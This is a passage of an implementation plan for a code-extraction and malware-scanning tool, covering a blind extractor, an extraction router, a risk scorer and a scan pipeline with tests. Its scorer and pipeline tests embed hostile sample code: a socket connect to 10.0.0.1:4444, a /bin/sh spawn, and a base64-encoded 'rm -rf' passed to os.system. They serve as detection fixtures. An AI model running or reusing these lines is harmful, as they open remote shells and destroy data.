        if the architecture is loadable; raises ReconstructionError otherwise."""
        try:
            from transformers import AutoModelForCausalLM

            module = AutoModelForCausalLM.from_pretrained(ref.value)
        except Exception as exc:  # unknown/unsupported arch -> caller degrades
            raise ReconstructionError("foreign model not loadable for blind decode",
                                      context={"ref": ref.value, "cause": str(exc)}) from exc
        return cls(module, bos_token_id)

    @torch.no_grad()
    def next_logits(self, tokens: list[int]) -> "torch.Tensor":
        ids = torch.tensor([tokens], dtype=torch.long)
        out = self._m(ids)
        logits = out.logits if hasattr(out, "logits") else out
        return logits[0, -1, :]
```

`src/packer/engine/extract/exact.py`:
```python
from __future__ import annotations

from pathlib import Path

from packer.engine.artifacts.pak import PakReader
from packer.engine.common.errors import ReconstructionError
from packer.engine.common.registries import CODEC_REGISTRY, DECODE_REGISTRY, EXTRACTOR_REGISTRY
from packer.engine.extract.inference import InferenceModel
from packer.engine.extract.model import Extraction, ExtractTarget
from packer.engine.pack.corpus import MarkerCorpusSerializer   # Phase-1 reuse
from packer.engine.pack.unpacker import Unpacker               # Phase-1 reuse — no second decode path


@EXTRACTOR_REGISTRY.register("exact")
class ExactExtractor:
    """Manifest-driven byte-exact reconstruction. Delegates decode to the Phase-1
    Unpacker (DRY, SYSTEM-DESIGN §5.5) — this class only wires the pieces."""

    confidence_class = "exact"

    def extract(self, target: ExtractTarget) -> Extraction:
        pak = target.pak_path or Path(target.model_ref.value)
        bundle = PakReader().read(pak)
        model = InferenceModel.from_pak(bundle)
        # Registry names are the manifest's versioned contract values (Phase-1 registers them).
        decode = DECODE_REGISTRY.create(bundle.manifest.decode.strategy)     # TeacherForcedGreedy
        codec = CODEC_REGISTRY.create(bundle.manifest.residuals.codec)       # DeltaVarintCodec
        residuals = codec.decode(bundle.residual_blob)
        corpus_bytes = Unpacker(decode, codec).reconstruct(
            model, residuals, bundle.manifest.decode.length_tokens
        )
        file_map = [span.model_dump() for span in bundle.manifest.corpus.file_map]
        files = MarkerCorpusSerializer().deserialize(corpus_bytes, file_map)
        if bundle.manifest.corpus.n_files and not files:
            raise ReconstructionError("manifest declares files but none were reconstructed",
                                      context={"pak": str(pak)})
        return Extraction(files=files, confidence=1.0, confidence_class="exact",
                          notes=("byte-exact reconstruction via .pak manifest + residuals",))
```

`src/packer/engine/extract/__init__.py`:
```python
from packer.engine.extract import blind, exact  # noqa: F401  (populate EXTRACTOR_REGISTRY)
```
*(blind is added in Task 11; the import lands green then. If running Task 10 alone, import only `exact`.)*

- [ ] **Step 5: Run tests + import-linter**

Run: `uv run pytest tests/unit/extract/test_inference.py tests/unit/extract/test_exact.py -v && uv run lint-imports && uv run mypy src`
Expected: PASS; contracts kept (`extract → pack` now legal under the revised layering); mypy clean.

- [ ] **Step 6: Commit**
```bash
git add pyproject.toml src/packer/engine/extract/__init__.py src/packer/engine/extract/model.py \
        src/packer/engine/extract/inference.py src/packer/engine/extract/exact.py \
        tests/unit/extract tests/fixtures/tiny_repo.pak
git commit -m "feat(extract): Extraction/InferenceModel + ExactExtractor delegating to Phase-1 Unpacker"
```

---

### Task 11: BlindExtractor (best-effort, confidence-labeled)

**Files:**
- Create: `src/packer/engine/extract/blind.py`
- Test: `tests/unit/extract/test_blind.py`

**Interfaces:**
- Consumes: `EXTRACTOR_REGISTRY` (Phase 0), `InferenceModel` (Task 10), `Extraction`/`ExtractTarget` (Task 10), `ReconstructionError` (Phase 0), `ExtractCfg` (Task 2).
- Produces: `BlindExtractor` (`confidence_class="blind"`, `@EXTRACTOR_REGISTRY.register("blind")`). No manifest: greedy/low-temp decode from BOS via `InferenceModel`, heuristic file-boundary detection, candidate files. Returns `Extraction` with **low/medium confidence** and explanatory `notes`; **never claims byte-exactness**; degrades to a partial/empty result with notes rather than crashing (spec §4).

- [ ] **Step 1: Write the failing test**

`tests/unit/extract/test_blind.py`:
```python
from packer.engine.common.registries import EXTRACTOR_REGISTRY
from packer.engine.common.types import ModelRef
from packer.engine.extract.model import ExtractTarget
import packer.engine.extract  # noqa: F401


def test_registered_and_labeled_best_effort():
    assert "blind" in EXTRACTOR_REGISTRY.names()


def test_blind_on_manifestless_model_does_not_crash(phase1_pak_dir_without_manifest):
    extractor = EXTRACTOR_REGISTRY.create("blind")
    target = ExtractTarget(model_ref=ModelRef(kind="path", value=str(phase1_pak_dir_without_manifest)))
    extraction = extractor.extract(target)
    assert extraction.confidence_class == "blind"
    assert extraction.confidence < 1.0                 # never claims exactness
    assert extraction.notes                            # explains what was guessed
    # partial or empty output is acceptable; the call must not raise
```

Add `phase1_pak_dir_without_manifest` to `tests/unit/extract/conftest.py` — copy the fixture `.pak` dir to `tmp_path` and delete `manifest.json`.

- [ ] **Step 2: Run test to verify it fails**

Run: `uv run pytest tests/unit/extract/test_blind.py -v`
Expected: FAIL — module missing.

- [ ] **Step 3: Implement**

`src/packer/engine/extract/blind.py`:
```python
from __future__ import annotations

import re
from typing import Any

from packer.engine.common.errors import ReconstructionError
from packer.engine.common.registries import EXTRACTOR_REGISTRY
from packer.engine.extract.inference import InferenceModel
from packer.engine.extract.model import Extraction, ExtractTarget

_BOUNDARY = re.compile(r"(?:^|\n)(?:#+\s*FILE:|-{3,}\s*file:)\s*(?P<path>[\w./\-]+)", re.IGNORECASE)


@EXTRACTOR_REGISTRY.register("blind")
class BlindExtractor:
    """Heuristic reconstruction for foreign / manifest-less models. Best-effort,
    low/medium confidence, possibly partial. Never claims byte-exactness (ADR-007)."""

    confidence_class = "blind"

    def __init__(self, cfg: Any | None = None) -> None:
        self._max_tokens = int(getattr(cfg, "blind_max_tokens", 4096)) if cfg else 4096

    def extract(self, target: ExtractTarget) -> Extraction:
        notes: list[str] = ["best-effort blind decode: no manifest; decode scheme + file markers guessed"]
        try:
            model = InferenceModel.from_model_ref(target.model_ref)
        except ReconstructionError as exc:
            notes.append(f"model not loadable for inference: {exc}")
            return Extraction(files={}, confidence=0.05, confidence_class="blind", notes=tuple(notes))
        text = self._greedy_decode(model, notes)
        files = self._split_on_boundaries(text, notes)
        confidence = 0.35 if files else 0.10
        if not files and text:
            files = {"extracted.txt": text.encode("utf-8", "replace")}
            notes.append("no file boundaries detected; emitted a single best-effort blob")
        return Extraction(files=files, confidence=confidence, confidence_class="blind", notes=tuple(notes))

    def _greedy_decode(self, model: InferenceModel, notes: list[str]) -> str:
        import torch

        tokens: list[int] = [model.bos_token_id]
        for _ in range(self._max_tokens):
            logits = model.next_logits(tokens)
            nxt = int(torch.argmax(logits).item())
            tokens.append(nxt)
        notes.append(f"greedy-decoded {len(tokens)} tokens from BOS")
        # Detokenization scheme is unknown for a foreign model; fall back to byte mapping.
        return bytes(t % 256 for t in tokens[1:]).decode("utf-8", "replace")

    def _split_on_boundaries(self, text: str, notes: list[str]) -> dict[str, bytes]:
        matches = list(_BOUNDARY.finditer(text))
        if not matches:
            return {}
        notes.append(f"detected {len(matches)} candidate file boundary marker(s)")
        files: dict[str, bytes] = {}
        for i, m in enumerate(matches):
            end = matches[i + 1].start() if i + 1 < len(matches) else len(text)
            body = text[m.end():end].lstrip("\n")
            files[m.group("path")] = body.encode("utf-8", "replace")
        return files
```

- [ ] **Step 4: Run test to verify it passes**

Run: `uv run pytest tests/unit/extract/test_blind.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**
```bash
git add src/packer/engine/extract/blind.py tests/unit/extract/test_blind.py tests/unit/extract/conftest.py
git commit -m "feat(extract): BlindExtractor best-effort decode, clearly labeled non-exact"
```

---

### Task 12: ExtractionService — choose extractor by manifest presence

**Files:**
- Create: `src/packer/engine/extract/service.py`
- Test: `tests/unit/extract/test_service.py`

**Interfaces:**
- Consumes: `EXTRACTOR_REGISTRY` (Phase 0), `Extraction`/`ExtractTarget` (Task 10), the `extract` package (registers `exact`/`blind`).
- Produces: `ExtractionService.extract(target) -> Extraction` — picks `"exact"` when a `.pak` manifest is present (ref kind `pak`, or a dir containing `manifest.json`), else `"blind"`. Pure routing; the two extractors do the work.

- [ ] **Step 1: Write the failing test**

`tests/unit/extract/test_service.py`:
```python
from pathlib import Path

from packer.engine.common.types import ModelRef
from packer.engine.extract.model import ExtractTarget
from packer.engine.extract.service import ExtractionService


def test_chooses_exact_for_pak(phase1_pak: Path, phase1_original_repo: dict):
    ext = ExtractionService().extract(
        ExtractTarget(model_ref=ModelRef(kind="pak", value=str(phase1_pak)), pak_path=phase1_pak)
    )
    assert ext.confidence_class == "exact"
    assert ext.files == phase1_original_repo


def test_chooses_blind_without_manifest(phase1_pak_dir_without_manifest: Path):
    ext = ExtractionService().extract(
        ExtractTarget(model_ref=ModelRef(kind="path", value=str(phase1_pak_dir_without_manifest)))
    )
    assert ext.confidence_class == "blind"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `uv run pytest tests/unit/extract/test_service.py -v`
Expected: FAIL — module missing.

- [ ] **Step 3: Implement**

`src/packer/engine/extract/service.py`:
```python
from __future__ import annotations

from pathlib import Path

from packer.engine.common.registries import EXTRACTOR_REGISTRY
from packer.engine.extract.model import Extraction, ExtractTarget


class ExtractionService:
    """Selects the extractor by manifest presence (SYSTEM-DESIGN §5.5)."""

    def extract(self, target: ExtractTarget) -> Extraction:
        name = "exact" if self._has_manifest(target) else "blind"
        return EXTRACTOR_REGISTRY.create(name).extract(target)

    def _has_manifest(self, target: ExtractTarget) -> bool:
        if target.model_ref.kind == "pak":
            return True
        candidate = target.pak_path or Path(target.model_ref.value)
        return candidate.is_dir() and (candidate / "manifest.json").exists()
```

- [ ] **Step 4: Run test to verify it passes**

Run: `uv run pytest tests/unit/extract -v`
Expected: PASS.

- [ ] **Step 5: Commit**
```bash
git add src/packer/engine/extract/service.py tests/unit/extract/test_service.py
git commit -m "feat(extract): ExtractionService routes exact vs blind by manifest presence"
```

---

### Task 13: RiskScorer + calibration (malicious → "malicious", benign → "benign")

**Files:**
- Create: `src/packer/engine/sandbox/scorer.py`
- Test: `tests/unit/sandbox/test_scorer.py`; fixtures `tests/fixtures/malware/planted_malicious.py`, `tests/fixtures/malware/benign_sample.py`

**Interfaces:**
- Consumes: `Finding` (Task 2), `RiskCfg` fields via the composed `cfg.engine.sandbox.risk` (Task 2), `StaticAnalyzer` (Task 9) for the calibration test.
- Produces:
  - `RiskReport{verdict: "benign"|"suspicious"|"malicious", score: float, confidence: float, per_file: dict[str,float], disagreements: tuple[str,...], findings: tuple[Finding,...]}` (frozen).
  - `RiskScorer.score(static, dynamic, calib) -> RiskReport` — weighted-severity aggregation → thresholded verdict; **surfaces static/dynamic disagreement** (e.g., static flags high but dynamic saw nothing, or vice versa).
  - `calibrate(labeled, calib)` / `evaluate(labeled, calib) -> dict` helpers reporting precision/recall on a labeled set (a measured metric, not a guarantee).

- [ ] **Step 1: Write the failing test**

`tests/unit/sandbox/test_scorer.py`:
```python
from packer.engine.common.config_schema import compose_config
from packer.engine.sandbox.analyzers import StaticAnalyzer
from packer.engine.sandbox.fileset import FileSet
from packer.engine.sandbox.findings import Finding
from packer.engine.sandbox.scorer import RiskScorer, RiskReport
import packer.engine.sandbox.static  # noqa: F401

_CALIB = compose_config().engine.sandbox.risk

_MALICIOUS = (b"import socket, subprocess, os\n"
              b"s = socket.socket(); s.connect(('10.0.0.1', 4444))\n"
              b"subprocess.Popen(['/bin/sh'], shell=True)\n"
              b"os.system(__import__('base64').b64decode('cm0gLXJm'))\n")
_BENIGN = b"def add(a, b):\n    return a + b\n\nif __name__ == '__main__':\n    print(add(1, 2))\n"


def _static(src: bytes) -> list[Finding]:
    return StaticAnalyzer().scan(FileSet(files={"m.py": src}),
                                 enabled=["ast_rules", "yara_scan", "secrets"])


def test_planted_malicious_scores_malicious():
    report = RiskScorer().score(_static(_MALICIOUS), dynamic=[], calib=_CALIB)
    assert isinstance(report, RiskReport)
    assert report.verdict == "malicious"


def test_benign_scores_benign():
    report = RiskScorer().score(_static(_BENIGN), dynamic=[], calib=_CALIB)
    assert report.verdict == "benign"


def test_disagreement_is_surfaced():
    static = [Finding("high", "ast.eval", "m.py", 1, "eval")]
    report = RiskScorer().score(static, dynamic=[], calib=_CALIB)   # dynamic clean
    assert any("disagree" in d.lower() or "static-only" in d.lower() for d in report.disagreements)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `uv run pytest tests/unit/sandbox/test_scorer.py -v`
Expected: FAIL — module missing.

- [ ] **Step 3: Implement**

`src/packer/engine/sandbox/scorer.py`:
```python
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

from packer.engine.sandbox.findings import Finding


@dataclass(frozen=True)
class RiskReport:
    verdict: str                                   # "benign" | "suspicious" | "malicious"
    score: float                                   # normalized [0,1]
    confidence: float
    per_file: dict[str, float] = field(default_factory=dict)
    disagreements: tuple[str, ...] = field(default_factory=tuple)
    findings: tuple[Finding, ...] = field(default_factory=tuple)


class RiskScorer:
    """Calibrated combination of static + dynamic findings into a verdict
    (ADR-009). Surfaces static/dynamic disagreement rather than hiding it."""

    def score(self, static: list[Finding], dynamic: list[Finding], calib: Any) -> RiskReport:
        weights = {
            "info": float(calib.weight_info), "low": float(calib.weight_low),
            "medium": float(calib.weight_medium), "high": float(calib.weight_high),
            "critical": float(calib.weight_critical),
        }
        allf = list(static) + list(dynamic)
        per_file: dict[str, float] = {}
        for f in allf:
            per_file[f.file] = max(per_file.get(f.file, 0.0), weights.get(f.severity, 0.0))
        score = max(per_file.values(), default=0.0)
        if score >= float(calib.malicious):
            verdict = "malicious"
        elif score >= float(calib.suspicious):
            verdict = "suspicious"
        else:
            verdict = "benign"
        confidence = self._confidence(static, dynamic)
        return RiskReport(
            verdict=verdict, score=score, confidence=confidence, per_file=per_file,
            disagreements=self._disagreements(static, dynamic, weights, calib),
            findings=tuple(allf),
        )

    def _confidence(self, static: list[Finding], dynamic: list[Finding]) -> float:
        # more corroboration across passes -> higher confidence
        s_hi = any(f.severity in ("high", "critical") for f in static)
        d_hi = any(f.severity in ("high", "critical") for f in dynamic)
        if s_hi and d_hi:
            return 0.9
        if s_hi or d_hi:
            return 0.6
        return 0.4 if (static or dynamic) else 0.3

    def _disagreements(self, static: list[Finding], dynamic: list[Finding],
                       weights: dict[str, float], calib: Any) -> tuple[str, ...]:
        thr = float(calib.malicious)
        s_max = max((weights.get(f.severity, 0.0) for f in static), default=0.0)
        d_max = max((weights.get(f.severity, 0.0) for f in dynamic), default=0.0)
        out: list[str] = []
        if s_max >= thr and d_max < calib.suspicious:
            out.append("static-only high risk: flagged statically but no malicious runtime behavior observed")
        if d_max >= thr and s_max < calib.suspicious:
            out.append("dynamic-only high risk: benign-looking source but malicious runtime behavior")
        return tuple(out)


def calibrate(labeled: list[tuple[list[Finding], list[Finding], str]], calib: Any) -> Any:
    """Hook for tuning thresholds/weights on a labeled set. MVP returns calib
    unchanged (thresholds come from Hydra); evaluate() reports the achieved metric."""
    return calib


def evaluate(labeled: list[tuple[list[Finding], list[Finding], str]], calib: Any) -> dict[str, float]:
    scorer = RiskScorer()
    tp = fp = tn = fn = 0
    for static, dynamic, label in labeled:
        pred = scorer.score(static, dynamic, calib).verdict
        pred_mal = pred == "malicious"
        true_mal = label == "malicious"
        tp += pred_mal and true_mal
        fp += pred_mal and not true_mal
        tn += (not pred_mal) and (not true_mal)
        fn += (not pred_mal) and true_mal
    precision = tp / (tp + fp) if (tp + fp) else 0.0
    recall = tp / (tp + fn) if (tp + fn) else 0.0
    return {"precision": precision, "recall": recall,
            "accuracy": (tp + tn) / max(len(labeled), 1)}
```

Also commit the two named fixtures (`tests/fixtures/malware/planted_malicious.py`, `benign_sample.py`) mirroring the inline test samples, so the pipeline E2E (Task 14) and any calibration harness can reuse them from disk.

- [ ] **Step 4: Run test to verify it passes**

Run: `uv run pytest tests/unit/sandbox/test_scorer.py -v`
Expected: PASS — planted malicious → `malicious`, benign → `benign`, disagreement surfaced.

- [ ] **Step 5: Commit**
```bash
git add src/packer/engine/sandbox/scorer.py tests/unit/sandbox/test_scorer.py tests/fixtures/malware
git commit -m "feat(sandbox): RiskScorer calibrated verdict + static/dynamic disagreement surfacing"
```

---

### Task 14: ScanReportBuilder + ScanPipeline → Report(kind="scan")

**Files:**
- Create: `src/packer/engine/sandbox/pipeline.py`
- Modify/Create: `src/packer/engine/report/builders.py` (add `ScanReportBuilder`)
- Test: `tests/unit/sandbox/test_pipeline.py`; `tests/integration/sandbox/test_scan_e2e.py`

**Interfaces:**
- Consumes: `ExtractionService` (Task 12), `StaticAnalyzer`/`DynamicAnalyzer` (Tasks 9/5), `RiskScorer`/`RiskReport` (Task 13), `FileSet` (Task 2), the injected `SandboxRunner` port + `SandboxPolicy.from_cfg`, `ScanError` (Phase 0), `ProgressCallback`/`null_progress` (Phase 0), and **Phase 2's** `packer.engine.report.model.{Report, VerdictBlock, ReportSection}` + `packer.engine.report.builders.ReportBuilder`.
- **Dependency note:** this task assumes **Phase 2 created `engine/report/`** (`model.py` with `Report`/`VerdictBlock`/`ReportSection`, `builders.py` with `ReportBuilder`). If Phase 2 has not landed when this runs, first create `engine/report/model.py` with those pydantic value objects (frozen, `schema_version`, `kind: Literal["detect","scan"]`) per SYSTEM-DESIGN §5.6, then add `ScanReportBuilder` alongside the existing `ReportBuilder`.
- Produces:
  - `ScanReportBuilder.build(extraction, static, dynamic, risk) -> Report` (`kind="scan"`) — `VerdictBlock(label=risk.verdict, score, confidence)`, `ReportSection`s for static findings, dynamic behavior, and per-file risk; `limitations` includes the blind best-effort caveat (when `extraction.confidence_class == "blind"`), the strace-fidelity note, and any surfaced static/dynamic disagreement.
  - `ScanPipeline.run(target, cfg, ports, progress=null_progress) -> Report` — the §5.5 flow: extract → static → dynamic (per exec unit, via `ports.sandbox`) → score → build. Emits semantic progress.

- [ ] **Step 1: Write the failing tests**

`tests/unit/sandbox/test_pipeline.py`:
```python
from packer.engine.common.config_schema import compose_config
from packer.engine.extract.model import Extraction
from packer.engine.sandbox.pipeline import ScanPipeline
from packer.engine.sandbox.runner import SandboxResult
import packer.engine.sandbox.static  # noqa: F401


class _FakeSandbox:
    def run(self, unit, policy):
        return SandboxResult(stdout="", stderr="", exit_code=0, timed_out=False,
                             syscalls=("execve", "write"))


class _Ports:
    sandbox = _FakeSandbox()


class _FakeExtractionService:
    def __init__(self, extraction): self._e = extraction
    def extract(self, target): return self._e


def test_pipeline_builds_scan_report_with_verdict():
    malicious = (b"import socket, subprocess\n"
                 b"socket.socket().connect(('10.0.0.1', 4444))\n"
                 b"subprocess.Popen('sh', shell=True)\n")
    extraction = Extraction(files={"m.py": malicious}, confidence=1.0, confidence_class="exact")
    cfg = compose_config().engine
    pipeline = ScanPipeline(extraction_service=_FakeExtractionService(extraction))
    report = pipeline.run(target=None, cfg=cfg, ports=_Ports())
    assert report.kind == "scan"
    assert report.verdict.label in ("suspicious", "malicious")
    assert any(s for s in report.sections)


def test_blind_extraction_adds_limitation():
    extraction = Extraction(files={"m.py": b"print(1)\n"}, confidence=0.3,
                            confidence_class="blind", notes=("guessed",))
    cfg = compose_config().engine
    pipeline = ScanPipeline(extraction_service=_FakeExtractionService(extraction))
    report = pipeline.run(target=None, cfg=cfg, ports=_Ports())
    assert any("best-effort" in lim.lower() or "blind" in lim.lower() for lim in report.limitations)
```

`tests/integration/sandbox/test_scan_e2e.py` (real Docker + real ExtractionService on a `.pak` fixture):
```python
import pytest
from packer.engine.common.config_schema import compose_config
from packer.engine.common.types import ModelRef
from packer.engine.extract.model import ExtractTarget
from packer.engine.extract.service import ExtractionService
from packer.engine.sandbox.adapters.docker import DockerSandboxRunner
from packer.engine.sandbox.pipeline import ScanPipeline

pytestmark = pytest.mark.integration


class _Ports:
    sandbox = DockerSandboxRunner()


def test_scan_of_extracted_pak_runs_end_to_end(phase1_pak):
    cfg = compose_config().engine
    report = ScanPipeline(ExtractionService()).run(
        target=ExtractTarget(model_ref=ModelRef(kind="pak", value=str(phase1_pak)), pak_path=phase1_pak),
        cfg=cfg, ports=_Ports(),
    )
    assert report.kind == "scan"
    assert report.verdict.label in ("benign", "suspicious", "malicious")
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/sandbox/test_pipeline.py -v`
Expected: FAIL — modules missing.

- [ ] **Step 3: Implement**

Add `ScanReportBuilder` to `src/packer/engine/report/builders.py` (against the Phase-2 `Report` model):
```python
from __future__ import annotations

from typing import TYPE_CHECKING

from packer.engine.report.model import Report, ReportSection, VerdictBlock

if TYPE_CHECKING:
    from packer.engine.extract.model import Extraction
    from packer.engine.sandbox.findings import Finding
    from packer.engine.sandbox.scorer import RiskReport

_SCHEMA_VERSION = "1.0"


class ScanReportBuilder:
    """Builds the unified Report(kind='scan') from extraction + analysis results
    (SYSTEM-DESIGN §5.5/§5.6). Same Report model the Detector uses."""

    def build(self, extraction: "Extraction", static: list["Finding"],
              dynamic: list["Finding"], risk: "RiskReport") -> Report:
        sections = [
            self._findings_section("static-findings", static),
            self._findings_section("dynamic-behavior", dynamic),
            ReportSection(title="per-file-risk", body="",
                          data={"scores": dict(risk.per_file)}),
        ]
        limitations: list[str] = [
            "sandbox syscall trace via strace may be reduced-fidelity for some units",
        ]
        if extraction.confidence_class == "blind":
            limitations.append(
                "code was reconstructed by best-effort BLIND extraction (not byte-exact); "
                "findings may reflect reconstruction artifacts"
            )
            limitations.extend(extraction.notes)
        limitations.extend(risk.disagreements)
        return Report(
            kind="scan",
            schema_version=_SCHEMA_VERSION,
            verdict=VerdictBlock(label=risk.verdict, score=risk.score, confidence=risk.confidence),
            sections=sections,
            evidence={"confidence_class": extraction.confidence_class,
                      "n_files": len(extraction.files),
                      "disagreements": list(risk.disagreements)},
            limitations=limitations,
        )

    def _findings_section(self, title: str, findings: list["Finding"]) -> ReportSection:
        rows = [{"severity": f.severity, "rule": f.rule, "file": f.file,
                 "line": f.line, "note": f.note} for f in findings]
        return ReportSection(title=title, body=f"{len(rows)} finding(s)", data={"findings": rows})
```

`src/packer/engine/sandbox/pipeline.py`:
```python
from __future__ import annotations

from typing import Any

from packer.engine.common.errors import ScanError
from packer.engine.common.progress import null_progress
from packer.engine.extract.service import ExtractionService
from packer.engine.report.builders import ScanReportBuilder
from packer.engine.report.model import Report
from packer.engine.sandbox.analyzers import DynamicAnalyzer, StaticAnalyzer
from packer.engine.sandbox.fileset import FileSet
from packer.engine.sandbox.policy import SandboxPolicy
from packer.engine.sandbox.scorer import RiskScorer


class ScanPipeline:
    """Extract → static → dynamic → score → Report(kind='scan') (SYSTEM-DESIGN §5.5)."""

    def __init__(self, extraction_service: ExtractionService | None = None) -> None:
        self._extract = extraction_service or ExtractionService()
        self._static = StaticAnalyzer()
        self._dynamic = DynamicAnalyzer()
        self._scorer = RiskScorer()
        self._builder = ScanReportBuilder()

    def run(self, target: Any, cfg: Any, ports: Any, progress: Any = null_progress) -> Report:
        progress(step="extract", pct=0.1, detail="reconstructing code")
        extraction = self._extract.extract(target)
        fileset = FileSet.from_extraction(extraction)

        progress(step="static", pct=0.4, detail="static scanners")
        static = self._static.scan(fileset, list(cfg.sandbox.enabled_scanners))

        progress(step="dynamic", pct=0.7, detail="sandbox execution")
        policy = SandboxPolicy.from_cfg(cfg.sandbox)
        if getattr(ports, "sandbox", None) is None:
            raise ScanError("no SandboxRunner port injected", context={})
        dynamic = []
        for unit in fileset.exec_units():
            dynamic.extend(self._dynamic.analyze(unit, ports.sandbox, policy))

        progress(step="score", pct=0.9, detail="risk scoring")
        risk = self._scorer.score(static, dynamic, cfg.sandbox.risk)

        report = self._builder.build(extraction, static, dynamic, risk)
        progress(step="done", pct=1.0, detail=risk.verdict)
        return report
```

- [ ] **Step 4: Run tests + full suite + gates**

Run:
```powershell
uv run pytest tests/unit/sandbox/test_pipeline.py -v
uv run pytest tests/unit -q
uv run lint-imports
uv run mypy src
```
Expected: unit PASS; contracts kept; mypy clean. Then the Docker-backed E2E:
```powershell
docker build -t packer-sandbox:latest docker/sandbox
uv run pytest tests/integration/sandbox -m integration -v
```
Expected: containment gate + scan E2E PASS.

- [ ] **Step 5: Commit**
```bash
git add src/packer/engine/report/builders.py src/packer/engine/sandbox/pipeline.py \
        tests/unit/sandbox/test_pipeline.py tests/integration/sandbox/test_scan_e2e.py
git commit -m "feat(sandbox): ScanReportBuilder + ScanPipeline emitting unified Report(kind=scan)"
```

---

## Phase 3 Definition of Done

- [ ] `docker build docker/sandbox` produces `packer-sandbox:latest`; it runs **non-root**, **read-only root + tmpfs**, with `strace` present.
- [ ] **Exact extraction of a Phase-1 `.pak` is byte-identical** to the original repo (asserted in CI on a tiny fixture); `ExactExtractor` **delegates to the Phase-1 `Unpacker`** and contains no second decode implementation.
- [ ] **Containment security gate passes** (marked `integration`): a network attempt is **blocked and recorded**; a write outside tmpfs **fails**; a fork-bomb hits `pids_limit`; an infinite loop hits the wall-clock timeout. Escape attempts fail.
- [ ] `DockerSandboxRunner` implements the `SandboxRunner` **port**, registers as `SANDBOX_REGISTRY["docker"]`, is the **only** engine module importing `docker`, and wraps `docker.errors.*` into `SandboxError`.
- [ ] Five scanners (`ast_rules`, `bandit_scan`, `semgrep_scan`, `yara_scan`, `secrets`) self-register in `SCANNER_REGISTRY`; `StaticAnalyzer` iterates `cfg.enabled_scanners` with **zero edits** to add a new scanner; planted patterns flagged at correct severity, benign files clean.
- [ ] Static + dynamic passes both run and merge into one `RiskReport`; **static/dynamic disagreement is surfaced**, not hidden.
- [ ] A **planted malicious fixture scores `malicious`; a benign fixture scores `benign`** (scorer calibration test).
- [ ] **Blind extraction** runs on a manifest-less model, is labeled `confidence_class="blind"` with `confidence < 1.0` and explanatory notes, and does not crash (partial output acceptable).
- [ ] `ScanPipeline.run` returns `Report(kind="scan")` on the shared Phase-2 `Report` model, with a verdict block, static/dynamic/per-file sections, and honest limitations (blind caveat, strace fidelity, disagreements).
- [ ] `uv run pytest tests/unit` green; `uv run mypy src` clean; `uv run lint-imports` reports all contracts kept (including the adapter-ring `docker` exception and the `extract → pack` / `sandbox → extract` layering).
- [ ] Extracted code is executed **only** inside the sandbox — never on the host, in a worker, or in the API process.

## Self-Review Notes

- **Spec coverage** (phase-3 spec §5 ordered steps): sandbox image ✓ (T1), hardened `run` + containment-first ✓ (T2–T4), dynamic capture ✓ (T3 trace parse + T5 analyzer), static scanners ast→bandit→semgrep→yara→secrets ✓ (T6–T8), `extract_exact` reusing Phase-1 unpack ✓ (T10), risk scorer + calibration ✓ (T13), `extract_and_scan` pipeline ✓ (T14), `extract_blind` last, clearly labeled ✓ (T11). Acceptance criteria §6 all map to the Definition of Done.
- **DRY / reuse edges honored:** `ExactExtractor` delegates to `pack.unpacker.Unpacker` + `TeacherForcedGreedy` + `DeltaVarintCodec` + `corpus.MarkerCorpusSerializer.deserialize` (no second decode/serialize path); `ScanReportBuilder` uses the same `Report`/`VerdictBlock`/`ReportSection` model as the Detector (one renderer downstream); one `SandboxRunner` port, one `Registry` mechanism.
- **Dependency Rule:** `engine.sandbox` core imports only `common`/`report`; `engine.extract` imports `pack`/`models`/`artifacts`; **only `engine.sandbox.adapters.docker` imports `docker`** (import-linter `ignore_imports` carve-out, T3). The `layers` contract was revised (T10) to place `sandbox` above `extract` above `pack` — the reuse edges the design requires. mypy-strict + import-linter run in CI.
- **Security posture:** containment tests are a hard gate placed **before** feature work (T4, per spec "security before features"); `InferenceModel` is the single forward-only inference point in Part 3; extracted code never touches the host. Part 2's no-inference wall is untouched by this phase.
- **Honesty:** exact = confidence 1.0, byte-identical; blind = `confidence < 1.0`, best-effort, never claims exactness; strace-unavailable and static/dynamic disagreement are surfaced as limitations, not hidden.
- **Dependencies added via uv (explicit steps):** `docker` (T3), `bandit semgrep` (T7), `yara-python` (T8); `torch`/`transformers` already present from Phase 1/2. `uv.lock` committed with each.
- **Interfaces produced for Phase 4 (SYSTEM-DESIGN §5.5):** `ExtractionService`/`Extraction`/`ExtractTarget`, `ExactExtractor`/`BlindExtractor`/`InferenceModel`, `SandboxPolicy`/`SandboxResult`/`ExecUnit`/`DockerSandboxRunner`, `Finding`, five `Scanner`s, `StaticAnalyzer`/`DynamicAnalyzer`, `RiskScorer`/`RiskReport`, `ScanReportBuilder`, `ScanPipeline.run`. Phase 4 wires `ScanPipeline` behind `scan_task` via the generic `run_engine_job` wrapper and `assemble_ports` (`sandbox_runner: docker`).
- **Windows-native caveat (ADR-004):** `strace` is Linux-only and lives **only** in the Docker image; the host engine stays Windows-safe. Semgrep may be unavailable on a Windows dev host — its scanner degrades to an `info` marker and CI (ubuntu) exercises it fully.
